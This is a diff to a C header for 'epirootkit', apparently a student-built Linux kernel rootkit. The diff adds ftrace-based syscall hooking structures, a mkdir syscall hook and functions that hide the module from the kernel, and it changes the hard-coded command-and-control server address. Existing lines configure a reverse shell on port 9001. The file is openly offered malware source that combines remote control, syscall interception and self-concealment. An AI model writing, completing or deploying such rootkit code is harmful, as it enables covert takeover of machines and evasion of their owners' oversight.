@@ -1,13 +1,19 @@
 #ifndef EPIROOTKIT_H
 #define EPIROOTKIT_H
 
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/errno.h>
+#include <linux/ftrace.h>
+#include <linux/module.h>
 #include <linux/types.h>
+#include <linux/kallsyms.h>
+#include <linux/kprobes.h>
 #include <linux/slab.h>
-
-
+#include <linux/uaccess.h>
 
 // Configuration macros
-#define SERVER_IP "192.168.100.1"
+#define SERVER_IP "192.168.100.2"
 #define SERVER_PORT 4242
 #define REVERSE_SHELL_PORT 9001
 #define CONNEXION_MESSAGE "epirootkit: connexion established\n"
@@ -37,6 +43,8 @@ enum text_level {
 	CRIT,
 };
 
+extern size_t hook_array_size;
+
 // Global control variables
 extern struct socket *sock;					// Socket for network communication
 extern struct exec_code_stds exec_result;	// Last execution result
@@ -62,5 +70,39 @@ void stop_reverse_shell(void);							// Stop the reverse shell
 extern char *ip;
 extern int port;
 extern char *message;
+
+// Hooks and Ftrace parameters
+struct ftrace_hook
+{
+    const char *name;       /* Name of the target symbol */
+    void *function;         /* Address of the hook function */
+    void *original;         /* Pointer to storage for the original address */
+    unsigned long address;  /* Resolved address of the target symbol */
+    struct ftrace_ops ops;
+};
+
+#define SYSCALL_NAME(name) ("__x64_" name)
+#define HOOK(_name, _hook, _orig)                                              \
+    {                                                                          \
+        .name = SYSCALL_NAME(_name),                                           \
+        .function = (_hook),                                                   \
+        .original = (_orig),                                                   \
+    }
+
+unsigned long (*fh_init_kallsyms_lookup(void))(const char *);
+int fh_install_hook(struct ftrace_hook *hook);
+void fh_remove_hook(struct ftrace_hook *hook);
+int fh_install_hooks(struct ftrace_hook *hooks, size_t count);
+void fh_remove_hooks(struct ftrace_hook *hooks, size_t count);
+
+// Array of hooks for syscall table
+extern struct ftrace_hook hooks[];
+
+// Hooks
+asmlinkage int mkdir_hook(const char __user *pathname, int mode);
+
+// Hider
+void hide_module(void);		// Hide the module from the kernel
+void unhide_module(void);	// Unhide the module in the kernel
 
 #endif // EPIROOTKIT_H
